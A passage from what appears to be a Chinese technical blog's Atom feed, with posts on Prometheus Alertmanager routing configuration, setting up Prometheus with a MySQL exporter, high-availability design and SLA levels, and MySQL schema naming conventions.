    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;启动容器并启动bash(交互)：&lt;br&gt;docker run -i -t &lt;image_name container_id=&quot;&quot;&gt; /bin/bash&lt;/image_name&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;启动容器以后台方式运行&lt;br&gt;docker 
    
    </summary>
    
    
      <category term="docker centos" scheme="https://t1ger.github.io/tags/docker-centos/"/>
    
  </entry>
  
  <entry>
    <title>Prometheus的信使</title>
    <link href="https://t1ger.github.io/2016/11/19/Prometheus%E7%9A%84%E4%BF%A1%E4%BD%BF/"/>
    <id>https://t1ger.github.io/2016/11/19/Prometheus的信使/</id>
    <published>2016-11-19T02:27:03.000Z</published>
    <updated>2016-11-19T02:53:06.375Z</updated>
    
    <content type="html"><![CDATA[<p>前言</p>
<p>今天介绍下Prometheus的好基友Alertmanager，让我们看下官方是怎么介绍的呢</p>
<p>The Alertmanager handles alerts sent by client applications such as the Prometheus server. It takes care of deduplicating, grouping, and routing them to the correct receiver integrations such as email, PagerDuty, or OpsGenie. It also takes care of silencing and inhibition of alerts</p>
<p>下面让我们详细解释下</p>
<p>grouping<br>分组是指当出现问题时，Alertmanager会收到一个单一的通知，比如当系统宕机时，很有可能成百上千的警报会同时生成，这种机制在某节点服务器中断中特别有用。</p>
<p>inhibition of alerts<br>抑制是指当报警发出后，停止重复发送此警报引发的其他错误的报警机制。<br>场景：<br>当网络交换机节点故障，可以配置Alertmanager忽略由该警报触发而产生的所有其他警报，这可以防止通知数百或数千与此问题不相关的其他警报。</p>
<p>silencing<br>沉默是一种简单的特定时间静音提醒的机制。一种沉默是通过匹配器来配置，就像路由树一样。传入的警报会匹配RE，如果匹配，将不会为此警报发送通知。</p>
<p>设置警报和通知的主要步骤</p>
<ul>
<li>安装配置Alertmanager</li>
<li>配置Prometheus通过 -alertmanager.url与Alertmanager通信</li>
<li>在Prometheus中创建报警规则</li>
</ul>
<p>让我们来了解下它的架构吧，如下图:<br><img src="https://raw.githubusercontent.com/prometheus/alertmanager/4e6695682acd2580773a904e4aa2e3b927ee27b7/doc/arch.jpg" alt="Alertmanager架构图"></p>
<p>这里我简单聊聊配置文件，贴出官网的一个示例，具体详细配置，请移步<a href="https://github.com/prometheus/alertmanager" target="_blank" rel="external">这里</a><br>Alertmanager通过命令行flag和一个配置文件进行配置。命令行flag配置不变的系统参数、配置文件定义的禁止规则、通知路由和通知接收器。<br>Alertmanager在运行时加载配置，如果不能很好的形成新的配置，更改将不会被应用，并记录错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div></pre></td><td class="code"><pre><div class="line">global:</div><div class="line">  # The smarthost and SMTP sender used for mail notifications.</div><div class="line">  smtp_smarthost: &apos;localhost:25&apos;</div><div class="line">  smtp_from: &apos;alertmanager@example.org&apos;</div><div class="line"></div><div class="line"># The root route on which each incoming alert enters.</div><div class="line">route:</div><div class="line">  # The root route must not have any matchers as it is the entry point for</div><div class="line">  # all alerts. It needs to have a receiver configured so alerts that do not</div><div class="line">  # match any of the sub-routes are sent to someone.</div><div class="line">  receiver: &apos;team-X-mails&apos;</div><div class="line"></div><div class="line">  # The labels by which incoming alerts are grouped together. For example,</div><div class="line">  # multiple alerts coming in for cluster=A and alertname=LatencyHigh would</div><div class="line">  # be batched into a single group.</div><div class="line">  group_by: [&apos;alertname&apos;, &apos;cluster&apos;]</div><div class="line"></div><div class="line">  # When a new group of alerts is created by an incoming alert, wait at</div><div class="line">  # least &apos;group_wait&apos; to send the initial notification.</div><div class="line">  # This way ensures that you get multiple alerts for the same group that start</div><div class="line">  # firing shortly after another are batched together on the first</div><div class="line">  # notification.</div><div class="line">  group_wait: 30s</div><div class="line"></div><div class="line">  # When the first notification was sent, wait &apos;group_interval&apos; to send a batch</div><div class="line">  # of new alerts that started firing for that group.</div><div class="line">  group_interval: 5m</div><div class="line"></div><div class="line">  # If an alert has successfully been sent, wait &apos;repeat_interval&apos; to</div><div class="line">  # resend them.</div><div class="line">  repeat_interval: 3h</div><div class="line"></div><div class="line">  # All the above attributes are inherited by all child routes and can </div><div class="line">  # overwritten on each.</div><div class="line"></div><div class="line">  # The child route trees.</div><div class="line">  routes:</div><div class="line">  # This routes performs a regular expression match on alert labels to</div><div class="line">  # catch alerts that are related to a list of services.</div><div class="line">  - match_re:</div><div class="line">      service: ^(foo1|foo2|baz)$</div><div class="line">    receiver: team-X-mails</div><div class="line"></div><div class="line">    # The service has a sub-route for critical alerts, any alerts</div><div class="line">    # that do not match, i.e. severity != critical, fall-back to the</div><div class="line">    # parent node and are sent to &apos;team-X-mails&apos;</div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        severity: critical</div><div class="line">      receiver: team-X-pager</div><div class="line"></div><div class="line">  - match:</div><div class="line">      service: files</div><div class="line">    receiver: team-Y-mails</div><div class="line"></div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        severity: critical</div><div class="line">      receiver: team-Y-pager</div><div class="line"></div><div class="line">  # This route handles all alerts coming from a database service. If there&apos;s</div><div class="line">  # no team to handle it, it defaults to the DB team.</div><div class="line">  - match:</div><div class="line">      service: database</div><div class="line"></div><div class="line">    receiver: team-DB-pager</div><div class="line">    # Also group alerts by affected database.</div><div class="line">    group_by: [alertname, cluster, database]</div><div class="line"></div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        owner: team-X</div><div class="line">      receiver: team-X-pager</div><div class="line"></div><div class="line">    - match:</div><div class="line">        owner: team-Y</div><div class="line">      receiver: team-Y-pager</div><div class="line"></div><div class="line"></div><div class="line"># Inhibition rules allow to mute a set of alerts given that another alert is</div><div class="line"># firing.</div><div class="line"># We use this to mute any warning-level notifications if the same alert is</div><div class="line"># already critical.</div><div class="line">inhibit_rules:</div><div class="line">- source_match:</div><div class="line">    severity: &apos;critical&apos;</div><div class="line">  target_match:</div><div class="line">    severity: &apos;warning&apos;</div><div class="line">  # Apply inhibition if the alertname is the same.</div><div class="line">  equal: [&apos;alertname&apos;]</div><div class="line"></div><div class="line"></div><div class="line">receivers:</div><div class="line">- name: &apos;team-X-mails&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-X+alerts@example.org&apos;</div><div class="line"></div><div class="line">- name: &apos;team-X-pager&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-X+alerts-critical@example.org&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-X-key&gt;</div><div class="line"></div><div class="line">- name: &apos;team-Y-mails&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-Y+alerts@example.org&apos;</div><div class="line"></div><div class="line">- name: &apos;team-Y-pager&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-Y-key&gt;</div><div class="line"></div><div class="line">- name: &apos;team-DB-pager&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-DB-key&gt;</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/prometheus/alertmanager" target="_blank" rel="external">prometheus/alertmanager</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      The Alertmanager handles alerts sent by client applications such as the Prometheus server
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>监控工具之Prometheus</title>
    <link href="https://t1ger.github.io/2016/11/16/%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E4%B9%8BPrometheus/"/>
    <id>https://t1ger.github.io/2016/11/16/监控工具之Prometheus/</id>
    <published>2016-11-16T09:23:56.000Z</published>
    <updated>2016-11-16T15:44:20.262Z</updated>
    
    <content type="html"><![CDATA[<p>Prometheus是一个开源的系统监控和报警的工具包，最初由SoundCloud发布,大多数组件是用go完成的。Prometheus 监控数据通过服务或静态配置来发现<br>，通过pull方式采集时间序列，通过http协议传输，支持通过中介网关的push时间序列的方式，不依赖分布式存储，支持图表和dashboard等多种方式,适用于监控所有时间序列的项目。</p>
<p>下图是Prometheus和它的组件的整体架构：<br><img src="https://camo.githubusercontent.com/df3e3daf7d6809ba82986eb33664a4283314f7a9/68747470733a2f2f63646e2e7261776769742e636f6d2f70726f6d6574686575732f70726f6d6574686575732f653736316630642f646f63756d656e746174696f6e2f696d616765732f6172636869746563747572652e737667" alt="Prometheus架构"></p>
<p>Prometheus通过直接或者短时jobs中介网关收集监控数据，在本地存储所有收集到的数据，并且通过定义好的rules产生新的时间序列数据，或者发送警报。Promdash或者其他使用API的clients可以将采集到的数据可视化。</p>
<p>快速安装配置教程：<br>Prometheus可通过二进制安装或者docker安装，这里我们使用二进制安装<br><a href="https://prometheus.io/download" target="_blank" rel="external">下载最新版本</a> ，然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tar xvfz prometheus-*.tar.gz</div><div class="line">cd prometheus-*</div><div class="line">./prometheus -config.file=prometheus.yml</div></pre></td></tr></table></figure></p>
<p>在 <a href="http://localhost:9090" target="_blank" rel="external">http://localhost:9090</a> 可以看到状态页。你也可以通过 <a href="http://localhost:9090/metrics" target="_blank" rel="external">http://localhost:9090/metrics</a> 查看监控项<br>这里我们以监控mysql为例来说下部署流程<br>修改prometheus.yml，在文件最后添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- job_name: &apos;mysql&apos;</div><div class="line">    # Override the global default and scrape targets from this job every 5 seconds.</div><div class="line">    scrape_interval: 5s</div><div class="line">    # metrics_path defaults to &apos;/metrics&apos;</div><div class="line">    # scheme defaults to &apos;http&apos;.</div><div class="line">    static_configs:</div><div class="line">      - targets: [&apos;localhost:9104&apos;]</div><div class="line">        labels:</div><div class="line">          instance: db1</div></pre></td></tr></table></figure>
<p>重启prometheus服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ./prometheus -config.file=prometheus.yml</div></pre></td></tr></table></figure></p>
<p>再打开localhost:9090，查看Status -&gt;Targets页面下，就可以看到配置的两个target：一个是prometheus本身，State为UP，另一个是mysql，State为DOWN，因为我们还没有配置监控mysql的服务。</p>
<p>安装mysql exporter<br>这里可以直接使用docker或者下载二进制包解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull prom/mysqld-exporter</div></pre></td></tr></table></figure></p>
<p>mysql exporter 需要连接mysql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CREATE USER &apos;mysqlexporter&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;mysqlexporter&apos;;</div><div class="line">GRANT PROCESS, REPLICATION CLIENT, SELECT ON *.* TO &apos;mysqlexporter&apos;@&apos;localhost&apos;</div></pre></td></tr></table></figure></p>
<p>如果使用docker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker run -d \          </div><div class="line">-p 9104:9104 \        </div><div class="line">-e DATA_SOURCE_NAME=&quot;mysqlexporter:mysqlexporter@(localhost:3306)/data_store&quot; prom/mysqld-exporter</div></pre></td></tr></table></figure></p>
<p>如果使用二进制包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">tar zxf mysqld_exporter-* -C /usr/local/prometheus_exporters</div><div class="line">cd /usr/local/prometheus_exporters</div><div class="line">$ cat &lt;&lt; EOF &gt; .my.cnf</div><div class="line">[client]</div><div class="line">user=mysqlexporter</div><div class="line">password=mysqlexporter</div><div class="line">EOF</div><div class="line">$ ./mysqld_exporter -config.my-cnf=&quot;.my.cnf&quot;</div></pre></td></tr></table></figure></p>
<p>我们再次回到Status-&gt;Targets页面，可以看到两个Target的状态已经变成UP了</p>
<p>ref</p>
<p><a href="https://prometheus.io/" target="_blank" rel="external">prometheus.io</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Prometheus是一个开源的系统监控和报警的工具包，最初由SoundCloud发布,大多数组件是用go完成的。Prometheus 监控数据通过服务或静态配置来发现&lt;br&gt;，通过pull方式采集时间序列，通过http协议传输，支持通过中介网关的push时间序列的方式，不
    
    </summary>
    
    
      <category term="linux" scheme="https://t1ger.github.io/tags/linux/"/>
    
      <category term="google" scheme="https://t1ger.github.io/tags/google/"/>
    
      <category term="Prometheus" scheme="https://t1ger.github.io/tags/Prometheus/"/>
    
  </entry>
  
  <entry>
    <title>关于高可用的系统一点思考</title>
    <link href="https://t1ger.github.io/2016/11/11/%E5%85%B3%E4%BA%8E%E9%AB%98%E5%8F%AF%E7%94%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/"/>
    <id>https://t1ger.github.io/2016/11/11/关于高可用的系统一点思考/</id>
    <published>2016-11-11T09:42:34.000Z</published>
    <updated>2016-11-13T13:40:28.626Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面，此文章为转载，略微整理</p>
<h4 id="理解高可用系统"><a href="#理解高可用系统" class="headerlink" title="理解高可用系统"></a><b>理解高可用系统</b></h4><p>高可用，顾名思义就是要我们的计算环境(包括软硬件)做到full-time的可用性。通常在需要做好如下设计：</p>
<ul>
<li>对软硬件的冗余，以消除单点故障。任何系统都会有一个或多个冗余系统做standby</li>
<li>对故障的检测和恢复。检测故障以及用备份的节点接管故障点。就是我们常说的failover</li>
<li>需要很可靠的交汇点(CrossOver)。eg. 域名解析、负载均衡等</li>
</ul>
<p>说起来很简单，然而，细节决定成败，冗余节点最大的难题就是有状态的节点数据复制和数据一致性的保证(无状态节点冗余相对简单)：</p>
<ul>
<li>如果系统的数据镜像到冗余节点是异步的，那么failover的时候就会出现数据差异</li>
<li>如果系统在数据镜像到冗余节点是同步的，那么会导致冗余节点越多性能越慢。</li>
</ul>
<p>所以，很多高可用系统都是在做各种取舍，这需要比对着业务的特点来的，比如银行账号的余额是一个状态型的数据，那么，冗余时就必需做到强一致性，再比如说，订单记录属于追加性的数据，那么在failover的时候，就可以到备机上进行追加，这样就比较简单了。</p>
<p>下面，总结一下高可用的设计原理：</p>
<ul>
<li>要做到数据不丢，就必须持久化</li>
<li>要做到服务高可用，必须有备用，无论是应用结点还是数据结点</li>
<li>要做到复制，就会有数据一致性的问题</li>
<li>我们不可能做到100%的高可用，即我们能做到几个9的SLA</li>
</ul>
<h4 id="高可用技术方案的示例"><a href="#高可用技术方案的示例" class="headerlink" title="高可用技术方案的示例"></a><b>高可用技术方案的示例</b></h4><p>简单解释一下MySQL的这几个方案（主要是想表达一个越多的9就越复杂）</p>
<ul>
<li>Mysql Repleaction(一般配合keepalived 实现failover) 是传统的异步数据同步或是半同步Semi-Sync(只要有一个slave收到更新就返回成功）这个方式本质上不到2个9)</li>
<li>MMM/MHA通过MySQL replication技术可以实现两个服务器互为主从，且在任何时候只有一个节点可以被写入，避免了多点写入的数据冲突。同时，当可写的主节点故障时，MMM/MHA套件可以立刻监控到，然后将服务自动切换到另一个主节点，继续提供服务，从而实现MySQL的高可用。这个方案的可用性可以达到99%。备注：MMM项目已于2012停止更新</li>
<li>DRBD通过底层的磁盘同步技术来解决数据同步的问题，就是RAID 1——把两台以上的主机的硬盘镜像成一个。这个方案不到3个9</li>
<li>Solaris Clustering/Oracle VM ，这个机制监控了包括硬件、操作系统、网络和数据库。这个方案一般会伴随着节点间的“心跳机制”，而且还会动用到SAN（Storage Area Network）或是本地的分布式存储系统，还会动用虚拟化技术来做虚拟机的迁移以降低宕机时间的概率。这个解决方案完全就是一个“全栈式的解决方案”。这个方案接近4个9</li>
<li>MySQL Cluster是官方的一个开源方案，其把MySQL的集群分成SQL Node 和Data Node，Data Node是一个自动化sharing和复制的集群NDB，为了更高的可用性，MySQL Cluster采用了“完全同步”的数据复制的机制来冗余数据结点。这个方案接近5个9</li>
</ul>
<p>那么，这些2个9，3个9，4个9，5个9是什么意思呢？又是怎么来的呢？请往下看。</p>
<h4 id="高可用性SLA的定义"><a href="#高可用性SLA的定义" class="headerlink" title="高可用性SLA的定义"></a><b>高可用性SLA的定义</b></h4><p>重点来了，工业界有两种方法来测量SLA</p>
<ul>
<li>一个是故障发生到恢复的时间</li>
<li>另一个是两次故障间的时间</li>
</ul>
<p>通常我们采用前者，即故障发生到恢复的时间，也就是服务不可用时间</p>
<table>
<thead>
<tr>
<th style="text-align:left">系统可用性</th>
<th style="text-align:left">宕机时间/年</th>
<th style="text-align:left">宕机时间/月</th>
<th style="text-align:left">宕机时间/周</th>
<th style="text-align:left">宕机时间/天</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">90% (1个9)</td>
<td style="text-align:left">36.5 天</td>
<td style="text-align:left">72 小时</td>
<td style="text-align:left">16.8 小时</td>
<td style="text-align:left">2.4 小时</td>
</tr>
<tr>
<td style="text-align:left">99% (2个9)</td>
<td style="text-align:left">3.65 天</td>
<td style="text-align:left">7.20 小时</td>
<td style="text-align:left">1.68 小时</td>
<td style="text-align:left">14.4 分</td>
</tr>
<tr>
<td style="text-align:left">99.9% (3个9)</td>
<td style="text-align:left">8.76 小时</td>
<td style="text-align:left">43.8 分</td>
<td style="text-align:left">10.1 分钟</td>
<td style="text-align:left">1.44 分</td>
</tr>
<tr>
<td style="text-align:left">99.99% (4个9)</td>
<td style="text-align:left">52.56 分</td>
<td style="text-align:left">4.38 分</td>
<td style="text-align:left">1.01 分钟</td>
<td style="text-align:left">8.66 秒</td>
</tr>
<tr>
<td style="text-align:left">99.999% (5个9)</td>
<td style="text-align:left">5.26 分</td>
<td style="text-align:left">25.9 秒</td>
<td style="text-align:left">6.05 秒</td>
<td style="text-align:left">0.87 秒</td>
</tr>
</tbody>
</table>
<p>比如，99.999%的可用性，一年只能有5分半钟的服务不可用。感觉很难做到吧。<br>到 3 个 9 可以靠堆人，也就是 3 班倒之类的强制值班基本搞定。但是从 3 个 9 往上，就基本超出了人力的范畴，考验的是业务的自愈能力，架构的容灾、容错设计，灾备系统的完善等等。<br>据说Google 内部只有 4 个 9 以上的服务才会配备 SRE，SRE 是必须在接到报警 5 分钟之内上线处理问题的，否则报警系统自动升级到下一个 SRE。如果还没有，直接给老板发报警。</p>
<p>简而言之，SLA的几个9就是能持续提供可用服务的级别，不过，工业界中，会把服务不可用的因素分成两种：一种是有计划的，一种是无计划的。</p>
<p>无计划的</p>
<ul>
<li>系统级故障-包括主机、操作系统、中间件、数据库、网络、电源以及外围设备</li>
<li>数据和中介的故障-包括人员误操作、硬盘故障、数据乱了</li>
<li>外部因素-自然灾害、人为破坏、以及供电问题</li>
</ul>
<p>有计划的</p>
<ul>
<li>日常任务-备份、容量规划、用户和安全管理，后台批处理应用</li>
<li>运维相关-数据库维护、应用维护、中间件维护、操作系统维护、网络维护</li>
<li>升级相关-数据库、应用、中间件、操作系统、网络、包括硬件升级</li>
</ul>
<p>有计划的维护因素主要来自于变更管理，避免措施主要有以下几个方面：</p>
<ul>
<li>线下测试（Offline Test）</li>
<li>灰度发布</li>
<li>服务必须对回滚提供支持</li>
</ul>
<p>针对回滚，跟大家分享一下，保证药到病除：</p>
<p>理由1：我这个数据改动之后格式跟以前的不兼容了，回退也不能正常！<br>秘籍1：设计、开发时候就考虑好兼容性问题！！！比如说数据库改字段的事就不要做，改成另加一个字段就好。数据存储格式就最好采用 protobuf 这种支持数据版本、支持前后兼容性的方案。最差的情况，也要在变更实施『之前』，想清楚数据兼容性的问题。没有回滚脚本，不给更新，起码做到有备而战。</p>
<p>理由2：我这个变更删掉东西了！回退之后数据也没了！<br>秘籍2：你一定是在逗我。把这个变更打回去，分成两半。第一半禁止访问这个数据。等到发布之后真没问题了，再来发布第二半，第二半真正删掉数据。这样第一半实施之后需要回滚还可以再回去。</p>
<p>理由3：我这个变更发布了之后, 其他依赖这个系统的人都拿到了错误的数据，再回退也没用了，他们不会再接受老数据了！<br>秘籍3：这种比较常见出现在配置管理、缓存等系统中。对这类问题，最重要的就是，应该开发一种跟版本无关的刷新机制。触发刷新的机制应该独立于发布过程。 要有一个强制刷新数据的手段。</p>
<p>以上三个秘籍覆盖了100%的回滚兼容性问题，如果有不存在的，请务必告诉我！</p>
<h4 id="决定高可用的本质原因"><a href="#决定高可用的本质原因" class="headerlink" title="决定高可用的本质原因"></a><b>决定高可用的本质原因</b></h4><p><b>通过上述影响SLA的因素，我们可以看出实现5个9意味着一年的时间只能有5分钟不可用，如果没有一支技术牛逼的团队加上一套自动化的工具，怎么能有高可用系统呢</b></p>
<p>要实现高可用系统，其中包括但不限于：</p>
<ul>
<li>软件的设计、编码、测试、上线和软件配置的水平</li>
<li>工程师的技术水平</li>
<li>运维的管理和技术水平</li>
<li>数据中心的运营管理水平</li>
<li>依赖于第三方服务的管理水平</li>
</ul>
<p>ref<br><a href="http://coolshell.cn/articles/17459.htm" target="_blank" rel="external">关于高可用的系统</a><br><a href="https://blog.coding.net/blog/architecture-concept-and-practice-from-Google" target="_blank" rel="external">来自 Google 的高可用架构理念与实践</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      think about High Availability
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql数据库设计规范</title>
    <link href="https://t1ger.github.io/2016/11/11/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/"/>
    <id>https://t1ger.github.io/2016/11/11/mysql数据库设计规范/</id>
    <published>2016-11-11T03:55:39.000Z</published>
    <updated>2016-11-13T12:40:03.054Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面，此文章为转载，略微整理</p>
<h4 id="一、命名规范"><a href="#一、命名规范" class="headerlink" title="一、命名规范"></a>一、<b>命名规范</b></h4><p>[数据库环境介绍]</p>
<ul>
<li>开发环境(dev)：开发人员可读写，在不影响其他开发同事时可随意修改</li>
<li>测试环境(qa)：开发和测试可读写，可通过工具修改表结构</li>
<li>模拟环境(sim): 开发可读写，当有上线请求，会在这个环境预执行，这个环境供部署上线演练和压力测试使用</li>
<li>生产数据库从库(stage): 只读环境，不允许修改数据，不允许修改表结构；供线上排查问题，数据查询使用</li>
<li>生产环境(product): 开发不允许直接进行数据库操作，必须通过DBA进行操作并进行记录</li>
</ul>
<p>不同环境的机器，需要做到权限明确，读写账户分离，能区分具体业务。eg. r_dev,w_dev </p>
<p>[数据库命名规范]</p>
<ul>
<li>简洁明了，体现数据库的用途,建议使用名词</li>
<li>使用英文小写字母、下划线命名，不宜过长(12个字符以内)</li>
<li>默认字符集统一utf-8,如果需要存储emoj表情，需要使用UTF8mb4</li>
</ul>
<p>[表命名规范]</p>
<ul>
<li>具有统一前缀，相关功能表使用相同前缀(前缀名称一般不超过5字)，体现相关业务,建议使用名词</li>
<li>避免用ORACLE、MySQL的保留字，如desc，关键字如index</li>
<li>使用英文小写字母、下划线命名，不宜过长(12个字符以内)</li>
<li>引擎默认使用innodb,日志或报表酌情使用myisam(mysql8.0已经移除)</li>
<li>必须有主键，建议使用auto_increment的id作为主键（与业务无关）,和业务相关的要做为唯一索引；</li>
<li>所有的表都必须有注释，解释其存放的数据内容</li>
<li>预估数据量，如数据量比较大(char的表&gt;500W行，或int表&gt;1000W)需要考虑分表。分表策略与DBA协商</li>
<li>功能相近的，命名规则应该统一</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `app_store_log` (</div><div class="line">  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &apos;自增ID&apos;,</div><div class="line">  `appid` int(11) NOT NULL COMMENT &apos;应用ID&apos;,</div><div class="line">  `create_time` int(11) NOT NULL COMMENT &apos;建立时间&apos;,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `appid` (`appid`)</div><div class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&apos;应用商店记录表&apos;</div></pre></td></tr></table></figure>
<p>[字段命名规范]</p>
<ul>
<li>数据库字段命名与表命名相似</li>
<li>字段应该有注释，描述字段用途及必要内容的解释</li>
<li>外键统一用xxx-id的方式声明</li>
<li>表主键默认约定为id,自增类型</li>
<li>时间字段，除特殊情况一律采用int记录unix_timestamp</li>
<li>网络IP字段，除特殊情况一律采用bigint来记录inet_aton值</li>
<li>默认字段均为非空，最好指定默认值</li>
<li>有些驱动对tingint支持不够好，通常建议按容量来选择字段</li>
<li>text字段尽量少用，或者拆分到冗余表</li>
<li>对表加新字段，不允许指定字段位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `login_user` (</div><div class="line">  `id` int(10) NOT NULL AUTO_INCREMENT,</div><div class="line">  `jid` int(10) unsigned NOT NULL,</div><div class="line">  `user_id` int(10) NOT NULL COMMENT &apos;用户的id&apos;,</div><div class="line">  `username` varchar(50) NOT NULL COMMENT &apos;用户姓名&apos;,</div><div class="line">  `city` smallint(4) NOT NULL COMMENT &apos;城市&apos;,</div><div class="line">  `ip` bigint(14) NOT NULL COMMENT &apos;登陆ip&apos;,</div><div class="line">  `district_id` tinyint(2) NOT NULL COMMENT &apos;所在区域的id&apos;,</div><div class="line">  `district_name` varchar(20) NOT NULL COMMENT &apos;行政区名字&apos;,</div><div class="line">  `street_id` tinyint(2) NOT NULL COMMENT &apos;所在街道(地标)的id&apos;,</div><div class="line">  `street_name` varchar(20) NOT NULL COMMENT &apos;小区名字&apos;,</div><div class="line">  `status` tinyint(2) NOT NULL DEFAULT &apos;1&apos; COMMENT &apos;用户状态:0禁用 1正常&apos;,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `idx_jid` (`jid`),</div><div class="line">  KEY `user_id_index` (`user_id`)</div><div class="line">) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT=&apos;用户登陆表&apos;</div><div class="line"></div><div class="line"></div><div class="line">ALTER TABLE T_APP_VERSION ADD COLUMN FSECURITY SMALLINT(5) NOT NULL DEFAULT 0 COMMENT &apos;安全扫描结果&apos;;</div></pre></td></tr></table></figure>
